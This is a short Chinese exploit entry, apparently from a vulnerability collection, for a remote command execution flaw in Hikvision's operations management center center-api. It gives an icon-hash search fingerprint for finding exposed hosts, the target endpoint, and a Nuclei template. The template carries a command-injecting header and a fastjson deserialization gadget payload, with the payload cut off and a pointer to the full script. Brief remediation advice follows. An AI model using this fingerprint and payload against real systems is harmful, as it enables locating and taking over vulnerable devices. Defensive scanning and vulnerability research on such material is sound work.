# 海康威视运行管理中心center-api存在远程命令执行

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`hunter：web.icon=="e05b47d5ce11d2f4182a964255870b76"`
- **请求**：`POST /center/api/session HTTP/1.1`

**请求体 / payload**
```
1. Fofa
hunter：web.icon=="e05b47d5ce11d2f4182a964255870b76"
1. 部分界面如下
1. Nuclei
id: hikvision-center-api-rce
info:
name: hikvision-center-api-rce
author: m0be1
severity: critical
variables:
test: "{{to_lower(rand_base(5))}}"
http:
- raw:
-
Host: {{Hostname}}
Testcmd: echo {{test}}
Content-Type: application/json;charset=UTF-8
X-Language-Type: zh_CN
X-Requested-With: XMLHttpRequest
{"x":{{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSour…（脚本共 6242 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。